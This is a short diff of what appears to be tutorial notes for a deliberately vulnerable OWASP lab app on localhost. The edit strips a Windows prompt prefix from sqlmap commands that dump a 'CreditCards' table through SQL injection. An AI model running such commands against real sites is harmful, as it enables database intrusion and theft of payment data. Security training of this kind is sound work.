@@ -14,11 +14,11 @@ python sqlmap.py -u "https://localhost:44394/products1?id=1" --batch --tables -D
 ```
 
 ```
-D:\Duperele\Soft\sqlmap>python sqlmap.py -u "https://localhost:44394/products1?id=1" --batch --dump -T CreditCards -D Owasp
+python sqlmap.py -u "https://localhost:44394/products1?id=1" --batch --dump -T CreditCards -D Owasp
 ```
 
 ```
-D:\Duperele\Soft\sqlmap>python sqlmap.py -u "https://localhost:44394/products1?id=1" --batch --dump -T CreditCards -D Owasp --force-pivoting
+python sqlmap.py -u "https://localhost:44394/products1?id=1" --batch --dump -T CreditCards -D Owasp --force-pivoting
 ```
 
 ## SQL Injection step-by-step
